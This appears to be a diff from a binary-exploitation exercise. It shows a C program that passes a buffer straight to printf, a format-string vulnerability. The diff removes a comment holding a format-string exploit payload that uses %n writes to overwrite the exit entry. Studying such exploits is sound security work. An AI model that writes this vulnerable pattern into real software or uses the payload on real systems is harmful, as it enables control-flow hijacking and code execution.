@@ -14,6 +14,3 @@ int main() {
 	printf(buff);
 	exit(0);
 }
-
-
-// r <<< $(python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08' + '%44744d%10\$n%18710d%11\$n'") to erase exit, need to give string
